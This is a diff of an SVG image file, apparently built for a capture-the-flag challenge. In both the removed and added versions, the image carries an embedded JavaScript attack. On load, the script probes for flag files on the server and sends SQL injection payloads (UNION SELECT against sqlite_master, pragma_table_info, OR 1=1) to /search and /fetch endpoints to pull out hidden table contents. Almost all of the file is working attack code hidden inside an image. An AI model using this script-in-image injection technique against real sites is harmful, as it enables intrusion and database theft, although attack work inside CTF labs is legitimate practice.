@@ -1,189 +1,51 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
- <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
-<script type="text/javascript">
- console.log('Script started');
- // Try multiple potential flag locations
- const flagPaths = [
-   '/flag.txt',
-   '/flag',
-   '/app/flag.txt',
-   '/app/flag',
-   '/home/flag.txt',
-   '/home/flag',
-   '/etc/flag.txt',
-   '/etc/flag',
-   '/var/www/flag.txt',
-   '/var/www/flag',
-   '/var/www/html/flag.txt',
-   '/var/www/html/flag',
-   '/opt/flag.txt',
-   '/opt/flag',
-   '/.flag',
-   '/.flag.txt'
- ];
- 
- let foundFlag = false;
- 
- // Create a status display
- const statusDiv = document.createElement('div');
- statusDiv.style.position = 'fixed';
- statusDiv.style.top = '10px';
- statusDiv.style.left = '10px';
- statusDiv.style.backgroundColor = 'white';
- statusDiv.style.padding = '10px';
- statusDiv.style.border = '1px solid black';
- statusDiv.style.zIndex = '1000';
- statusDiv.innerText = 'Starting flag hunt...';
- document.body.appendChild(statusDiv);
- 
- async function checkPath(path) {
-   statusDiv.innerText = `Checking ${path}...`;
-   try {
-     const response = await fetch(path);
-     if (response.ok) {
-       const data = await response.text();
-       if (data.includes('nexus{') || data.includes('flag{') || data.includes('CTF{')) {
-         statusDiv.innerText = `FLAG FOUND at ${path}: ${data}`;
-         document.body.innerHTML = `<h1>FLAG FOUND at ${path}</h1><pre>${data}</pre>`;
-         alert(`FLAG FOUND: ${data}`);
-         foundFlag = true;
-         return true;
-       }
-     }
-   } catch (e) {
-     // Silently continue to next path
-   }
-   return false;
- }
- 
- // Try SQL injection via fetch endpoint
- async function tryFetchEndpoint() {
-   statusDiv.innerText = 'Trying fetch endpoint...';
-   
-   const payloads = [
-     "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --",
-     "' OR 1=1 --",
-     "' UNION SELECT 1,2 --",
-     "admin' --"
-   ];
-   
-   for (const payload of payloads) {
-     statusDiv.innerText = `Trying fetch with payload: ${payload}`;
-     try {
-       // Try both GET and POST methods
-       // POST with form data
-       const formData = new FormData();
-       formData.append('q', payload);
-       const postResp = await fetch('/fetch', {
-         method: 'POST',
-         body: formData
-       });
-       const postData = await postResp.text();
-       if (postData.includes('nexus{') || postData.includes('flag{') || postData.includes('CTF{')) {
-         statusDiv.innerText = `FLAG FOUND in POST response: ${postData}`;
-         document.body.innerHTML = `<h1>FLAG FOUND in POST response</h1><pre>${postData}</pre>`;
-         alert(`FLAG FOUND: ${postData}`);
-         return true;
-       }
-       
-       // GET with query parameter
-       const getResp = await fetch(`/fetch?q=${encodeURIComponent(payload)}`);
-       const getData = await getResp.text();
-       if (getData.includes('nexus{') || getData.includes('flag{') || getData.includes('CTF{')) {
-         statusDiv.innerText = `FLAG FOUND in GET response: ${getData}`;
-         document.body.innerHTML = `<h1>FLAG FOUND in GET response</h1><pre>${getData}</pre>`;
-         alert(`FLAG FOUND: ${getData}`);
-         return true;
-       }
-     } catch (e) {
-       // Continue to next payload
-     }
-   }
-   
-   return false;
- }
- 
- // Try to find the search endpoint
- async function trySearchEndpoint() {
-   statusDiv.innerText = 'Trying search endpoint...';
-   const sqlQuery = "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --";
-   
-   try {
-     const response = await fetch(`/search?q=${encodeURIComponent(sqlQuery)}`);
-     if (response.ok) {
-       const data = await response.text();
-       statusDiv.innerText = 'Got response from search endpoint!';
-       
-       // Look for table names that match our pattern (starting with _)
-       const tablePattern = /_[0-9a-f]{16}/g;
-       const foundTables = data.match(tablePattern);
-       
-       if (foundTables && foundTables.length > 0) {
-         statusDiv.innerText = `Found potential tables: ${foundTables.join(', ')}`;
-         
-         // For each found table, try to extract the column name and then the flag
-         for (const table of foundTables) {
-           statusDiv.innerText = `Trying to get columns for table: ${table}`;
-           
-           // Query to get column information
-           const columnQuery = `' UNION SELECT name, type FROM pragma_table_info('${table}') --`;
-           const colResp = await fetch(`/search?q=${encodeURIComponent(columnQuery)}`);
-           const colData = await colResp.text();
-           
-           // Look for column names that match our pattern (starting with flag_)
-           const columnPattern = /flag_[0-9a-f]{16}/g;
-           const foundColumns = colData.match(columnPattern);
-           
-           if (foundColumns && foundColumns.length > 0) {
-             statusDiv.innerText = `Found columns for ${table}: ${foundColumns.join(', ')}`;
-             
-             // Try each column to find the flag
-             for (const column of foundColumns) {
-               statusDiv.innerText = `Trying to extract flag from ${table}.${column}`;
-               const flagQuery = `' UNION SELECT id, ${column} FROM ${table} --`;
-               const flagResp = await fetch(`/search?q=${encodeURIComponent(flagQuery)}`);
-               const flagData = await flagResp.text();
-               
-               // Check if we found something that looks like our flag format
-               if (flagData.includes('nexus{')) {
-                 const flagMatch = flagData.match(/nexus\{[^}]*\}/);
-                 if (flagMatch) {
-                   const flag = flagMatch[0];
-                   statusDiv.innerText = `🎉 FLAG FOUND: ${flag}`;
-                   document.body.innerHTML = `<h1>FLAG FOUND: ${flag}</h1>`;
-                   alert(`FLAG FOUND: ${flag}`);
-                   return true;
-                 }
-               }
-             }
-           }
-         }
-       }
-     }
-   } catch (e) {
-     statusDiv.innerText = `Error with search endpoint: ${e.message}`;
-   }
-   
-   return false;
- }
- 
- // Main execution
- (async () => {
-   // First try direct flag fetching
-   for (const path of flagPaths) {
-     const found = await checkPath(path);
-     if (found) return;
-   }
-   
-   // Then try the fetch endpoint
-   const fetchResult = await tryFetchEndpoint();
-   if (fetchResult) return;
-   
-   // Finally try the search endpoint
-   const searchResult = await trySearchEndpoint();
-   if (searchResult) return;
-   
-   statusDiv.innerText = 'All attempts completed. Flag not found.';
- })();
-</script>
+  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
+  <script type="text/javascript"><![CDATA[
+    alert('Script started');
+    // Try multiple approaches with different endpoints
+    async function tryAllEndpoints() {
+      // 1. First try direct flag.txt
+      try {
+        const flagResp = await fetch('/flag.txt');
+        const flagData = await flagResp.text();
+        alert('Flag.txt response: ' + flagData);
+        if (flagData.includes('nexus{')) {
+          alert('FLAG FOUND in flag.txt: ' + flagData);
+          return;
+        }
+      } catch (e) {
+        alert('Error fetching flag.txt: ' + e.message);
+      }
+      // 2. Try the search endpoint with SQLi
+      try {
+        const sqlQuery = "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --";
+        const searchResp = await fetch('/search?q=' + encodeURIComponent(sqlQuery));
+        const searchData = await searchResp.text();
+        alert('Search endpoint response length: ' + searchData.length);
+        if (searchData.includes('_') && searchData.includes('flag_')) {
+          alert('Found promising data in search response!');
+        }
+      } catch (e) {
+        alert('Error with search endpoint: ' + e.message);
+      }
+      // 3. Try the fetch endpoint
+      try {
+        const params = new URLSearchParams();
+        params.append('q', "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --");
+        const fetchResp = await fetch('/fetch', {
+          method: 'POST',
+          body: params
+        });
+        const fetchData = await fetchResp.text();
+        alert('Fetch endpoint response length: ' + fetchData.length);
+        if (fetchData.includes('_') && fetchData.includes('flag_')) {
+          alert('Found promising data in fetch response!');
+        }
+      } catch (e) {
+        alert('Error with fetch endpoint: ' + e.message);
+      }
+    }
+    // Execute all approaches
+    tryAllEndpoints();
+  ]]></script>
 </svg>
